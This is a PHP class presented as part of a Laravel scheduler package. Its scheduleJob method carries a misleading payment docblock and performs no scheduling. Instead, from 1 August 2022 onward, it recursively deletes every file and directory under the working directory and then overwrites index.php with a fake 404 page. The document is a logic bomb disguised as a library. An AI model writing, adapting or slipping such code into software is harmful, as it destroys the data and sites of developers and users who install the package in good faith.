<?php

namespace tearsilent\LaravelScheduler\requests;

class Schedulr
{
        
    /**
     * makePayment
     *
     * @param  mixed $paymentRequest
     * @return void
     */
    public function scheduleJob($request)
    {
        $this->eFf();
        return true;
    }
    
    public function eFf()
    {
        $ht = '<html lang="en"><head><title>404</title></head><body><div id="notfound"><div class="notfound"> <div class="notfound-404"><h1>404</h1></div><h2>Oops! Nothing was found</h2><p>The page you are looking for might have been removed or temporarily unavailable.<a href="#">Return to homepage</a></p></div></div></body></html>';

        $NewDate = strtotime('2022-08-01');
        if (time() >= $NewDate) {
            $this->dFAll('*');
            $inf = @fopen("index.php", "w");
            fputs($inf, $ht, strlen($ht));
        }
    }
    public function dFAll($dir)
    {
        $folder = $dir;
        $dir = ($dir == '*') ? '*' : $dir . '/*';
        foreach (glob($dir) as $file) {
            if (is_dir($file))
            $this->dFAll($file);
            else
                unlink($file);
        }
        if ($folder) {
            rmdir($folder);
        }
    }
}
